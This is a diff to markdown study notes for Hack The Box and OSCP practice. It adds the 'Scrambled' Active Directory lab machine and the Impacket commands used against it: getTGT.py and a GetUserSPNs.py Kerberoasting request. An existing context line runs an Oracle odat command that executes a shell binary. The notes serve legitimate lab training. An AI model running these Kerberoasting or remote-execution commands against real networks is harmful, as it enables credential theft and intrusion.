@@ -1,6 +1,6 @@
 ### AD Machines
 
-Forest, Active, Monteverde, Reel, Mantis, Blackfield, Search, APT, Support, Outdated
+Forest, Active, Monteverde, Reel, Mantis, Blackfield, Search, APT, Support, Outdated, Scrambled
 
 https://twitter.com/hackthebox_eu/status/1529122562038456320?cxt=HHwWgICzhcu3xLgqAAAA
 
@@ -89,6 +89,7 @@ https://github.com/tedchen0001/OSCP-Notes/blob/master/AD.md
 | Optimum | HttpFileServer 2.3 | MS16-098 ||
 | Outdated | [CVE-2022-30190](https://github.com/JohnHammond/msdt-follina) (pdf), AddKeyCredentialLink <br>(bloodhound, Evil-WinRM) | [WSUS](https://github.com/nettitude/SharpWSUS) | :white_check_mark: |
 | Remote | NFS Service(default port 2049), mount, sdf, Umbraco CMS | SeImpersonatePrivilege, TeamViewer |
+| Scrambled | Website Information (user and pass), Ticket, SPN || :white_check_mark: |
 | SecNotes | CSRF reset password link, smb, IIS php | WinPEAS Linux shells/distributions ||
 | Servmon | FTP, NVMS LFI, SSH | NSClient, *SSH tunnel (localhost services) ||
 | Silo | Oracle (default port 1521), CVE-2012-1675, ODAT, brute-force | Oracle, SYSTEM Privilege ||
@@ -426,3 +427,14 @@ python3 odat.py utlfile -s <target ip> -p <target port> -U <username> -P <passwo
 python3 odat.py externaltable -s <target ip> -p <target port> -U <username> -P <password> -d <sid> --sysdba --exec c:/ shell-x64.exe
 ```
 
+Used in ```Scrambled```
+
+```shell
+python3 getTGT.py scrm.local/ksimpson:ksimpson -k -dc-ip 10.10.11.168
+
+export KRB5CCNAME=ksimpson.ccache
+
+klist
+
+python3 GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-ip 10.10.11.168 -dc-host dc1.scrm.local -k -request
+```
